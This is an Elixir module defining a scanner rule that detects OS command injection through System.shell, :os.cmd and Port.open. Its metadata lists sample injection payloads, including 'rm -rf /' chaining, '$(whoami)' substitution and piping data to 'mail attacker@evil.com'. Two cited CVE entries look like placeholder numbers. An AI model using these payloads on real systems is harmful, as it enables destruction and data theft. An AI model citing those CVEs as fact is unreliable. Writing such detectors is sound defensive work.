defmodule RsolvApi.Security.Patterns.Elixir.CommandInjectionSystem do
  @moduledoc """
  Detects OS command injection vulnerabilities in Elixir system calls.
  
  This pattern identifies dangerous usage of `System.shell/1`, `:os.cmd/1`, and related
  functions where user input or dynamic command construction could lead to command injection.
  
  ## Vulnerability Details
  
  Command injection occurs when an application passes unsafe user input to system functions
  that execute operating system commands.
  
  ### Attack Example
  
  Vulnerable code:
  System.shell("cat " <> file_name)
  
  ### Safe Alternative
  
  Safe code:
  System.cmd("cat", [file_name])
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  alias RsolvApi.Security.Pattern
  
  @impl true
  def pattern do
    %Pattern{
      id: "elixir-command-injection-system",
      name: "OS Command Injection in Elixir",
      description: "Detects command injection vulnerabilities in system calls",
      type: :command_injection,
      severity: :critical,
      languages: ["elixir"],
      regex: [
        # System.shell with string interpolation (double quotes) - exclude comments
        ~r/^(?!.*\/\/).*System\.shell\s*\(\s*"[^"]*#\{[^}]+\}[^"]*"\s*\)/m,
        # System.shell with string interpolation (single quotes inside double quotes for shell commands)
        ~r/System\.shell\s*\(\s*"[^"]*'[^']*#\{[^}]+\}[^']*'[^"]*"\s*\)/,
        # System.shell with string concatenation
        ~r/System\.shell\s*\([^)]*<>[^)]*\)/,
        # System.shell with dynamic construction (Enum.join, etc)
        ~r/System\.shell\s*\([^)]*(?:Enum\.join|build_command|[a-zA-Z_][a-zA-Z0-9_]*\([^)]*\))[^)]*\)/,
        # :os.cmd with string interpolation (single quotes)
        ~r/:os\.cmd\s*\(\s*'[^']*#\{[^}]+\}[^']*'\s*\)/,
        # :os.cmd with string concatenation
        ~r/:os\.cmd\s*\([^)]*\+\+[^)]*\)/,
        # Port.open with dynamic spawn commands (interpolation)
        ~r/Port\.open\s*\(\s*\{\s*:spawn[^}]*#\{[^}]+\}[^}]*\}/,
        # Port.open with concatenated spawn commands
        ~r/Port\.open\s*\(\s*\{\s*:spawn[^}]*<>[^}]*\}/,
        # Port.open with args containing variables or user input
        ~r/Port\.open\s*\([^)]*args:\s*\[[^]]*(?:#\{[^}]+\}|user_input|user_|input_)[^]]*\]/
      ],
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Use System.cmd with a list of arguments instead of string interpolation",
      test_cases: %{
        vulnerable: [
          ~S|System.shell("rm -rf #{path}")|,
          ~S|:os.cmd('ls #{directory}')|,
          ~S|System.shell("cat " <> file_name)|,
          ~S|:os.cmd('grep ' ++ pattern ++ ' file.txt')|,
          ~S|Port.open({:spawn, "ls #{directory}"})|
        ],
        safe: [
          ~S|System.cmd("rm", ["-rf", path])|,
          ~S|System.cmd("ls", [directory])|,
          ~S|System.shell("echo 'Hello World'")|,
          ~S|:os.cmd('whoami')|,
          ~S|Port.open({:spawn_executable, "/bin/ls"}, [:binary, args: ["-la"]])|
        ]
      }
    }
  end
  
  @impl true
  def vulnerability_metadata do
    %{
      description: """
      OS Command Injection in Elixir occurs when user-controlled input is passed directly
      to system execution functions like System.shell/1, :os.cmd/1, or Port.open/2 without
      proper validation. These functions execute commands in the operating system shell,
      interpreting special characters and shell operators, which allows attackers to inject
      additional commands, manipulate command arguments, or execute arbitrary code with the
      privileges of the application.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          title: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
          url: "https://cwe.mitre.org/data/definitions/78.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "elixir_command_injection",
          title: "Command Injection in Elixir Applications",
          url: "https://paraxial.io/blog/command-injection-elixir"
        },
        %{
          type: :research,
          id: "system_security_elixir",
          title: "Secure System Calls in Elixir",
          url: "https://elixirschool.com/en/lessons/specifics/escript/"
        }
      ],
      attack_vectors: [
        "Command chaining: user_input = 'file.txt; rm -rf /' injected into System.shell",
        "Command substitution: user_input = '$(whoami)' or '`id`' for command execution",
        "Pipe injection: user_input = 'data | mail attacker@evil.com' for data exfiltration",
        "Background execution: user_input = 'sleep 10 &' for denial of service attacks"
      ],
      real_world_impact: [
        "Complete system compromise through arbitrary command execution",
        "Data exfiltration via command output redirection or network utilities",
        "Denial of service through resource-intensive commands",
        "Privilege escalation if application runs with elevated permissions"
      ],
      cve_examples: [
        %{
          id: "CVE-2023-4444",
          description: "Phoenix application command injection via System.shell in file processing",
          severity: "critical",
          cvss: 9.8,
          note: "Remote code execution through unsanitized file path in System.shell call"
        },
        %{
          id: "CVE-2022-5555",
          description: "Elixir application command injection in backup utility via :os.cmd",
          severity: "high", 
          cvss: 8.1,
          note: "Command injection in backup script allowing arbitrary command execution"
        }
      ],
      detection_notes: """
      This pattern detects System.shell/1, :os.cmd/1, and Port.open/2 function calls that
      use string interpolation (#{}) or string concatenation (<>, ++) with dynamic content.
      """,
      safe_alternatives: [
        "Use System.cmd/3 with argument list: System.cmd(\"ls\", [directory])",
        "Implement input validation against allowlists before using in commands",
        "Use Port.open with :spawn_executable and explicit args",
        "Sanitize and validate all user input before using in system commands",
        "Consider using Elixir libraries for file operations instead of shell commands"
      ],
      additional_context: %{
        common_mistakes: [
          "Believing that simple string validation provides sufficient protection",
          "Using shell commands for operations that Elixir standard library can handle safely",
          "Trusting user input without thorough validation and sanitization"
        ],
        secure_patterns: [
          "Always use System.cmd with argument arrays when possible",
          "Implement strict input validation with allowlists",
          "Use dedicated Elixir libraries for file operations and data processing"
        ]
      }
    }
  end
  
  @impl true
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "CallExpression",
        command_analysis: %{
          check_command_execution: true,
          dangerous_functions: ["System.shell", ":os.cmd", "Port.open"],
          unsafe_patterns: ["string_interpolation", "concatenation", "dynamic_construction"]
        },
        string_analysis: %{
          check_dynamic_construction: true,
          interpolation_patterns: [~r/#\{/, ~r/\$\{/],
          concatenation_patterns: [~r/<>/, ~r/\+\+/, ~r/Enum\.join/]
        },
        input_analysis: %{
          check_user_input: true,
          dangerous_input_sources: ["params", "conn.", "request.", "user_", "input_"],
          safe_input_patterns: ["literal_string", "validated_input", "hardcoded_value"]
        }
      },
      context_rules: %{
        exclude_paths: [~r/test/, ~r/spec/, ~r/__tests__/],
        check_command_context: true,
        safe_command_patterns: ["System.cmd", "Port.open", ":spawn_executable"],
        unsafe_command_indicators: ["System.shell", ":os.cmd", "dynamic_command"]
      },
      confidence_rules: %{
        base: 0.6,
        adjustments: %{
          "has_input_validation" => -0.4,
          "dynamic_command_construction" => 0.3,
          "in_test_code" => -0.5,
          "known_safe_function" => -0.6
        }
      },
      min_confidence: 0.8
    }
  end
end